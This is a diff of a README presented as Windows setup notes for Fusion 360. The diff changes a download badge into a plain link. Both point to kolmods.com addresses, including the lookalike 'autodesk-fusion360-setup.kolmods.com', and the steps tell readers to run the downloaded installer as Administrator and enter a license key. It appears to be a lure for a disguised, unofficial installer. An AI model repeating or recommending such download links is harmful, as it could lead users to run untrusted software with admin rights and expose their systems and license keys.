@@ -1,14 +1,10 @@
-# Fusion 360 Windows Setup Notes
+# Fusion360 Windows Setup Notes
 
-<p align="center">
-  <a href="https://fusion360.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-Fusion%20360-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Fusion 360">
-  </a>
-</p>
+[⬇ Download Fusion360 for Windows](https://autodesk-fusion360-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **Fusion 360** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Fusion360** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,7 +12,7 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Fusion 360** from the Start menu
+5. Restart if the installer asks — then launch **Fusion360** from the Start menu
 
 ## What you can use it for
 
